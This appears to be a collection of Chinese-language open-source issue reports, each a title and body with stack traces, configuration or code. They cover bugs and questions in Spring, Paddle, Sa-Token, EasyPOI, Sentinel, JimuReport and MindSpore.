org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:90) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:117) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:106) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:199) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:791) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1417) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748)   <code>: dmc_kettle_category category_id_ category_name_ add_user_ edit_user_ del_flag_ create_time_ update_time_ category_id_"
gfile.IsFile不能判断文件是否存在，使终都判断成了存在,"如下图的代码如示：   <code>: path := ""/home/share/aamsapi/index/logs/2018/08/201808016_jkdb.txt"" flags1 := gfile.IsFile(path) if flags1 == true { println(""有"") } else { println(""无"") }"
1.3.21关于使用SQL Server数据库遇到的问题,"升级到1.3.21之后的操作预览查询语句的一些语法在SQL Server是不支持的，比如 子查询使用 order by 排序，limit关键词。请问有什么解决的办法吗？   <code>: 2021-05-07 11:25:37.430 DEBUG 16812 --- [nio-8086-exec-3] o.j.m.j.c.i.JimuReportInterceptor : JimuReportInterceptor check requestPath = /jmreport/queryFieldBySql 2021-05-07 11:25:37.431 DEBUG 16812 --- [nio-8086-exec-3] o.jeecg.modules.jmreport.desreport.a.a : ============解析sql========== org.springframework.jdbc.UncategorizedSQLException: PreparedStatementCallback; uncategorized SQLException for SQL [select * from ( select * from t_b_dmop where workday = '2021-03-01') sel_tab00 limit 0,1]; SQL state [S0001]; error code [102]; “limit”附近有语法错误。; nested exception is com.microsoft.sqlserver.jdbc.SQLServerException: “limit”附近有语法错误。 at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:89) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:81) at org.springframework.jdbc.core.JdbcTemplate.translateException(JdbcTemplate.java:1443) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:633) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:669) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:694) at org.springframework.jdbc.core.JdbcTemplate.query(JdbcTemplate.java:748) at org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate.query(NamedParameterJdbcTemplate.java:216) at org.springframework.jdbc.core.namedparam.NamedParameterJdbcTemplate.query(NamedParameterJdbcTemplate.java:223) at org.jeecgframework.minidao.aop.MiniDaoHandler.getReturnMinidaoResult(MiniDaoHandler.java:356) at org.jeecgframework.minidao.aop.MiniDaoHandler.invoke(MiniDaoHandler.java:103) at com.sun.proxy.$Proxy67.selectPageBySql(Unknown Source) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:344) at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:198) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.dao.support.PersistenceExceptionTranslationInterceptor.invoke(PersistenceExceptionTranslationInterceptor.java:139) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:212) at com.sun.proxy.$Proxy70.selectPageBySql(Unknown Source) at org.jeecg.modules.jmreport.desreport.service.a.h.parseReportSql(JmReportDbServiceImpl.java:571) at org.jeecg.modules.jmreport.desreport.service.a.h$$FastClassBySpringCGLIB$$4daca654.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:687) at org.jeecg.modules.jmreport.desreport.service.a.h$$EnhancerBySpringCGLIB$$9f9faff.parseReportSql(&lt;generated&gt;) at org.jeecg.modules.jmreport.desreport.a.a.a(DesignReportController.java:620) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202) at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:97) at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:542) at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:143) at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92) at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:78) at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343) at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:374) at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:65) at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:868) at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1590) at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) at java.lang.Thread.run(Thread.java:748) Caused by: com.microsoft.sqlserver.jdbc.SQLServerException: “limit”附近有语法错误。 at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(SQLServerException.java:196) at com.microsoft.sqlserver.jdbc.SQLServerStatement.getNextResult(SQLServerStatement.java:1454) at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.doExecutePreparedStatement(SQLServerPreparedStatement.java:388) at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement$PrepStmtExecCmd.doExecute(SQLServerPreparedStatement.java:338) at com.microsoft.sqlserver.jdbc.TDSCommand.execute(IOBuffer.java:4026) at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(SQLServerConnection.java:1416) at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(SQLServerStatement.java:185) at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeStatement(SQLServerStatement.java:160) at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.executeQuery(SQLServerPreparedStatement.java:281) at com.zaxxer.hikari.pool.ProxyPreparedStatement.executeQuery(ProxyPreparedStatement.java:52) at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.executeQuery(HikariProxyPreparedStatement.java) at org.springframework.jdbc.core.JdbcTemplate$1.doInPreparedStatement(JdbcTemplate.java:678) at org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:617) ... 75 more"
test_recurrent_op failed,"Please refer to the log test_recurrent_op failed 3 times since yesterday, we should disable it temporarily.   <code>: [06:17:57] : [Step 1/1] F [06:17:57] : [Step 1/1] ====================================================================== [06:17:57] : [Step 1/1] FAIL: test_backward (__main__.RecurrentOpTest2) [06:17:57] : [Step 1/1] ---------------------------------------------------------------------- [06:17:57] : [Step 1/1] Traceback (most recent call last): [06:17:57] : [Step 1/1] File ""test_recurrent_op.py"", line 189, in test_backward [06:17:57] : [Step 1/1] num_grad[idx], ana_grad[idx], rtol=0.1).all()) [06:17:57] : [Step 1/1] AssertionError: False is not true [06:17:57] : [Step 1/1] [06:17:57] : [Step 1/1] ----------------------------------------------------------------------"
第一部分第 3 小节存在未转换链接,第一部分第 3 小节有一个 markdown 链接格式没有被转换。 第 3 小节 的最后一行 在浏览页面中没有转换出链接。 期望效果 在浏览页面能看到 的链接。   <code>: 更多详细内容，请参考 [第 1 小节：什么是开源](./第 1 小节：什么是开源.md/#开源软件) 。 第 1 小节：什么是开源
【PaddlePaddle Hackathon】35、在 Paddle 中新增 paddle.nn.RNN 的测试用例,"（此 ISSUE 为 PaddlePaddle Hackathon 活动的任务 ISSUE，更多详见PaddlePaddle Hackathon） 【任务说明】 任务标题：新增 paddle.nn.RNN 的测试用例 技术标签：深度学习框架，python, 质量 任务难度：简单 详细描述：paddle.nn.RNN 是飞桨提供的循环神经网络，将输入的Cell封装为一个循环神经网络。它能够重复执行 直到遍历完input中的所有Tensor。需要从参数覆盖、正确性验证、数据类型覆盖、异常输入等方面添加测试用例. 【提交内容】 任务 PR 到 PaddleTest 任务单测文件 提交到目录framework/api 【技术要求】 了解 Paddle API的使用方式，该API的基本功能。 熟练掌握 Python   <code>: cell.forward()"
启动网关时sentinel配置报错,"启动时sentinel配置无法绑定，有点懵看不懂是什么越界了，是不是我少了什么操作。下面是我的部署环境 JDK1.8.0_25 Mysql5.7 Redis3.2 Maven3.5.4 Node10.16.3 nacos1.1.0 sentinel1.6.0 16:30:01.455 [main] WARN o.h.v.i.m.p.AnnotationMetaDataProvider - [findTypeAnnotationConstraintsForExecutableParameter,736] - Constraints on the parameters of constructors of non-static inner classes are not supported if those parameters have a generic type due to JDK bug JDK-5087240. java.lang.ArrayIndexOutOfBoundsException: 2 Description: Failed to bind properties under 'spring.cloud.sentinel.datasource.ds1.nacos.rule-type' to com.alibaba.cloud.sentinel.datasource.RuleType: Action: Update your application's configuration   <code>: Property: spring.cloud.sentinel.datasource.ds1.nacos.rule-type Value: flow Origin: class path resource [bootstrap.yml]:41:24 Reason: 2"
MPI分布式训练test_program初始化问题,"Paddle版本：1.5 训练环境MPI集群 采用preserver-trainer模式训练模型，其中包含一个分布式embedding词表，program创建代码为 训练代码如下   <code>: with fluid.program_guard(train_program, startup_program): with fluid.unique_name.guard(): graph_wrapper = pgl.graph_wrapper.GraphWrapper( ""sub_graph"", place, node_feat=data['graph'].node_feat_info()) model_loss, recall, precision,all_acc = build_graph_model( graph_wrapper, hidden_size=args.hidden_size, graphsage_type=args.graphsage_type, k_hop=len(samples),num_node=data['graph'].num_nodes) test_program = train_program.clone(for_test=True) with fluid.program_guard(train_program, startup_program): with fluid.unique_name.guard(): adam = fluid.optimizer.SGD(learning_rate=args.lr) adam.minimize(model_loss) for epoch in range(args.epoch): batch = 0 start = time.time() start_batch = time.time() batch_time = 0 for batch_feed_dict in train_iter(): end_batch = time.time() batch_time += (end_batch-start_batch) batch += 1 if batch%100==0: #print train log outs = exe.run(train_program, feed=batch_feed_dict, fetch_list=fetch_list) end = time.time() log.info('epoch: %d, batch: %d, loss: %f, recall: %f, precision: %f, all_acc: %f, avg time: %f, avg read time: %f'% \ (epoch, batch, outs[0], outs[1], outs[2], outs[3], (end-start)/100.0, batch_time/batch)) start = time.time() else: exe.run(train_program, feed=batch_feed_dict) if batch%100==0: recall = run_val(val_iter, exe, test_program, 'eval', fetch=fetch_list) if recall &gt; best_recall: best_recall = recall fluid.io.save_persistables(exe, './checkpoint', train_program) start = time.time() start_batch = time.time() ```python 可以正常训练但是在run_val的时候报错paddle.fluid.core_avx.EnforceNotMet: Invoke operator lookup_table error. 以及 C++ Callstacks: holder_ should not be null Tensor not initialized yet when Tensor::type() is called. at [/paddle/paddle/fluid/framework/tensor.h:139] [任务链接] (http://10.73.201.14:8910/fileview.html?type=logsdir&amp;path=/&amp;instance=5.app-user-20190911150613-6320--yinshuo01_test_paddle) 谢谢！"
多账号认证-->不同体系不同 SaTokenConfig 配置,"使用版本: 1.31.0 涉及的功能模块：多账号认证--&gt;不同体系不同 SaTokenConfig 配置 我经过以下步骤测试： 新建了StpWxUserUtil类，然后注入多账号JWT，根据文档再设置自定义的Config对象 测试请求发送获取Config对象： 得出以下结果： 生成的结果并未实现自定义的Config SaTokenConfig [tokenName=Authorization, timeout=3600, activityTimeout=3600, isConcurrent=true, isShare=false, maxLoginCount=12, isReadBody=true, isReadHeader=true, isReadCookie=false, tokenStyle=uuid, dataRefreshPeriod=30, tokenSessionCheckLogin=true, autoRenew=true, tokenPrefix=Bearer, isPrint=true, isLog=true, jwtSecretKey=abcdefghijklmnopqrstuvwxyz, idTokenTimeout=86400, basic=, currDomain=null, checkIdToken=false, cookie=SaCookieConfig [domain=null, path=null, secure=false, httpOnly=false, sameSite=null]] 实际还是走的配置Config，我的配置如下： 和文档上描述的不一致： 完全按文档上的进行处理，但并未获取到自定义的Config对象内容； https://sa-token.dev33.cn/doc.html#/up/many-account?id=_8%e3%80%81%e4%b8%8d%e5%90%8c%e4%bd%93%e7%b3%bb%e4%b8%8d%e5%90%8c-satokenconfig-%e9%85%8d%e7%bd%ae   <code>: @Component public class StpWxUserUtil { @Autowired public void setWxUserStpLogic() { StpWxUserUtil.setStpLogic(new StpLogicJwtForSimple(StpWxUserUtil.TYPE)); } private StpWxUserUtil() {} /** * 账号类型标识 */ public static final String TYPE = ""wx_user""; /** * 底层的 StpLogic 对象 */ public static StpLogic stpLogic = new StpLogic(TYPE){ // 首先自定义一个 Config 对象 final SaTokenConfig config = new SaTokenConfig() .setTokenName(""Authorization"") .setTimeout(1800) .setActivityTimeout(1000) .setIsShare(false) .setIsReadCookie(false) .setTokenPrefix(""Bearer"") .setJwtSecretKey(""abcdefghijklmnopqrstuvwxyz"") .setIsLog(true) // ... 其它set ; // 然后重写 stpLogic 配置获取方法 @Override public SaTokenConfig getConfig() { return config; } }; // .....其它按StpUtil内容不变 } @SaCheckLogin(type = StpWxUserUtil.TYPE) @GetMapping(""/test"") public R&lt;SaTokenConfig&gt; testGet(){ System.out.println(SaManager.getConfig()); return R.ok(SaManager.getStpLogic(""wx_user"").getConfig()); } # Sa-Token配置 sa-token: # token名称 (同时也是cookie名称) token-name: Authorization # token有效期 设为一天 (必定过期) 单位: 秒 timeout: 3600 # token临时有效期 (指定时间无操作就过期) 单位: 秒 activity-timeout: 3600 # 是否允许同一账号并发登录 (为true时允许一起登录, 为false时新登录挤掉旧登录) is-concurrent: true # 在多人登录同一账号时，是否共用一个token (为true时所有登录共用一个token, 为false时每次登录新建一个token) is-share: false # 是否尝试从header里读取token is-read-head: true # 是否尝试从cookie里读取token is-read-cookie: false # token前缀 token-prefix: ""Bearer"" # jwt秘钥 jwt-secret-key: abcdefghijklmnopqrstuvwxyz # 是否输出操作日志 is-log: true public class StpUserUtil { // 使用匿名子类 重写`stpLogic对象`的一些方法 public static StpLogic stpLogic = new StpLogic(""user"") { // 首先自定义一个 Config 对象 SaTokenConfig config = new SaTokenConfig() .setTokenName(""satoken"") .setTimeout(2592000) // ... 其它set ; // 然后重写 stpLogic 配置获取方法 @Override public SaTokenConfig getConfig() { return config; } }; // ... }"
导出时addIndex一旦设置为true则会抛null异常,"一旦设置了addindex为true，如下： 就会抛出null异常 看了下大概问题出在这句 一旦getCellValue方法执行到 序号 对应的ExcelExportEntity时，其methods和method都是null，如此get出来就是个null指针，那么链式调用invoke必然抛异常 应该是序号的实现方式的问题   <code>: ExportParams params = new ExportParams(); params.setType(ExcelType.XSSF); params.setAddIndex(true); Workbook wb = ExcelExportUtil.exportExcel(params, XXX.class, XXXList); cn.afterturn.easypoi.exception.excel.ExcelExportException: Excel导出错误 at cn.afterturn.easypoi.excel.export.ExcelExportService.insertDataToSheet(ExcelExportService.java:209) ~[easypoi-base-3.1.0.jar:?] at cn.afterturn.easypoi.excel.export.ExcelExportService.createSheetForMap(ExcelExportService.java:145) ~[easypoi-base-3.1.0.jar:?] at cn.afterturn.easypoi.excel.export.ExcelExportService.createSheet(ExcelExportService.java:115) [easypoi-base-3.1.0.jar:?] at cn.afterturn.easypoi.excel.ExcelExportUtil.exportExcel(ExcelExportUtil.java:79) [easypoi-base-3.1.0.jar:?] at com.chengyu56.oa.Application.main(Application.java:59) [classes/:?] Caused by: java.lang.NullPointerException at cn.afterturn.easypoi.excel.export.base.ExportCommonService.getCellValue(ExportCommonService.java:189) ~[easypoi-base-3.1.0.jar:?] at cn.afterturn.easypoi.excel.export.base.BaseExportService.createCells(BaseExportService.java:99) ~[easypoi-base-3.1.0.jar:?] at cn.afterturn.easypoi.excel.export.ExcelExportService.insertDataToSheet(ExcelExportService.java:178) ~[easypoi-base-3.1.0.jar:?] ... 4 more value = entity.getMethods() != null ? getFieldBySomeMethod(entity.getMethods(), obj) : entity.getMethod().invoke(obj, new Object[]{});"
"{code: 200, message: ""微服务故障, 请稍后再试""}","经常会出现下面问题，是因为什么呢？设备新能问题吗？   <code>: {data: {…}, status: 504, statusText: """", headers: {…}, config: {…}, …} config : {adapter: ?, transformRequest: {…}, transformResponse: {…}, timeout: 60000, xsrfCookieName: ""XSRF-TOKEN"", …} data : {code: 200, message: ""微服务故障, 请稍后再试""} headers : {pragma: ""no-cache"", content-type: ""application/json;charset=UTF-8"", cache-control: ""no-cache, no-store, max-age=0, must-revalidate"", expires: ""0""} request : XMLHttpRequest {onreadystatechange: ?, readyState: 4, timeout: 60000, withCredentials: false, upload: XMLHttpRequestUpload, …} status : 504 statusText : """" __proto__ : Object"
【论文复现】torch的SGD中的momentum_buffer参数对应关系,"paltform : AIStudio version: 2.0.1 torch中的SGD具有momentum参数，并且其具有momentum_buffer，paddle优化器只有Momentum具有momentum参数，paddle中利用查询如下： 我想知道的作用，它对应于torch中的吗   <code>: optimizer.state[self.sub_weight]['momentum_buffer'] = self.sub_weight_mom dir(opt_pfc) module_partial_fc = PartialFC( rank=rank, resume=0, batch_size=cfg.batch_size, margin_softmax=margin_softmax, num_classes=cfg.num_classes, sample_rate=cfg.sample_rate, embedding_size=cfg.embedding_size, prefix=cfg.output) opt_pfc = paddle.optimizer.Momentum(parameters=module_partial_fc.parameters(), learning_rate=0.1, momentum=0.9) dir(opt_pfc) ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', '_accumulators', '_accumulators_holder', '_add_accumulator', '_append_dgc_ops', '_append_optimize_op', '_apply_optimize', '_create_accumulators', '_create_global_learning_rate', '_create_master_weight', '_create_optimization_pass', '_create_param_lr', '_dtype', '_finish_update', '_get_accumulator', '_get_device_for_param', '_get_no_grad_set', '_global_learning_rate', '_grad_clip', '_learning_rate', '_learning_rate_map', '_master_weights', '_momentum', '_multi_precision', '_name', '_opti_name_list', '_param_device_map', '_parameter_list', '_regularization_coeff', '_regularization_method', '_rescale_grad', '_update_param_device_map', '_use_nesterov', '_velocity_acc_str', 'apply_gradients', 'backward', 'clear_grad', 'clear_gradients', 'get_lr', 'get_opti_var_name_list', 'helper', 'minimize', 'regularization', 'set_lr', 'set_state_dict', 'state_dict', 'step', 'type'] _accumulators momentum_buffer"
定位dynamic_gru的问题,"I tried to run text classification problem with the above script, and the command line showed me the following error. Is there any updates on fliud API leading to this issue?   <code>: import sys import numpy as np import paddle.v2 as paddle import paddle.v2.fluid as fluid def to_lodtensor(data, place): seq_lens = [len(seq) for seq in data] cur_len = 0 lod = [cur_len] for l in seq_lens: cur_len += l lod.append(cur_len) flattened_data = np.concatenate(data, axis=0).astype(""int64"") flattened_data = flattened_data.reshape([len(flattened_data), 1]) res = fluid.LoDTensor() res.set(flattened_data, place) res.set_lod([lod]) return res def load_vocab(filename): vocab = {} with open(filename) as f: wid = 0 for line in f: vocab[line.strip()] = wid wid += 1 return vocab word_dict = load_vocab(sys.argv[1]) word_dict[""&lt;unk&gt;""] = len(word_dict) #vocabulary size dict_dim = len(word_dict) # embedding dim emb_dim = 128 # hidden dim hid_dim = 128 # hidden dim2 hid_dim2 = 96 # class num class_dim = 2 data = fluid.layers.data( name=""words"", shape=[1], dtype=""int64"", lod_level=1) # label data label = fluid.layers.data(name=""label"", shape=[1], dtype=""int64"") # embedding emb = fluid.layers.embedding(input=data, size=[dict_dim, emb_dim]) gru_h = fluid.layers.dynamic_gru(input=emb, size=hid_dim, is_reverse=False) gru_max = fluid.layers.sequence_pool(input=gru_h, pool_type='max', act='tanh') fc1 = fluid.layers.fc(input=gru_max, size=hid_dim2, act='tanh') prediction = fluid.layers.fc(input=fc1, size=class_dim, act='softmax') cost = fluid.layers.cross_entropy(input=prediction, label=label) avg_cost = fluid.layers.mean(x=cost) sgd_optimizer = fluid.optimizer.SGD(learning_rate=0.001) sgd_optimizer.minimize(avg_cost) accuracy = fluid.evaluator.Accuracy(input=prediction, label=label) inference_program = fluid.default_main_program().clone() with fluid.program_guard(inference_program): test_target = accuracy.metrics + accuracy.states inference_program = fluid.io.get_inference_program(test_target) BATCH_SIZE = 4 train_reader = paddle.batch( paddle.reader.shuffle( paddle.dataset.imdb.train(word_dict), buf_size=5000), batch_size=BATCH_SIZE) test_reader = paddle.batch( paddle.reader.shuffle( paddle.dataset.imdb.test(word_dict), buf_size=5000), batch_size=BATCH_SIZE) place = fluid.CPUPlace() def test(exe): accuracy.reset(exe) for batch_id, data in enumerate(test_reader()): input_seq = to_lodtensor(map(lambda x:x[0], data), place) y_data = np.array(map(lambda x: x[1], data)).astype(""int64"") y_data = y_data.reshape([-1, 1]) acc = exe.run(inference_program, feed={""words"": input_seq, ""label"": y_data}) return accuracy.eval(exe) exe = fluid.Executor(place) feeder = fluid.DataFeeder(feed_list=[data, label], place=place) exe.run(fluid.default_startup_program()) PASS_NUM = 30 for pass_id in xrange(PASS_NUM): accuracy.reset(exe) for data in train_reader(): cost_val, acc_val = exe.run(fluid.default_main_program(), feed=feeder.feed(data), fetch_list=[avg_cost, accuracy.metrics[0]]) pass_acc = accuracy.eval(exe) pass_test_acc = test(exe) print(""test_acc: %f"" % pass_test_acc) gru_h = fluid.layers.dynamic_gru(input=emb, size=hid_dim, is_reverse=False) AttributeError: 'module' object has no attribute 'dynamic_gru'"
http接入后，报Initialization of bean failed,pom文件 启动日志   <code>: &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.7.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;!-- &lt;scope&gt;provided&lt;/scope&gt; --&gt; &lt;/dependency&gt; &lt;!--依賴shenyu服务网关jar包--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.shenyu&lt;/groupId&gt; &lt;artifactId&gt;shenyu-spring-boot-starter-client-springmvc&lt;/artifactId&gt; &lt;version&gt;2.4.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;
[ST][MS][log]atan2算子隐式类型转换报错信息需要,"atan2 当有一个输入为int32时，算子隐式类型转换报错信息需要 / 硬件环境: /device GPU等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative 执行上述代码 1、Tensor[Float16], Tensor[Float32], Tensor[Float64]}, but got Tensor[Int32]. 类型小写比较合适 2、实际上并不是不能int32，只是不能两个参数同时为int32 责任人 梁晨辉   <code>: import numpy as np import mindspore import mindspore.ops as ops from mindspore import Tensor x = Tensor(np.array([2]), mindspore.int32) y = Tensor(np.array([1, 2]), mindspore.int32) output = ops.atan2(x, y) print(output)"
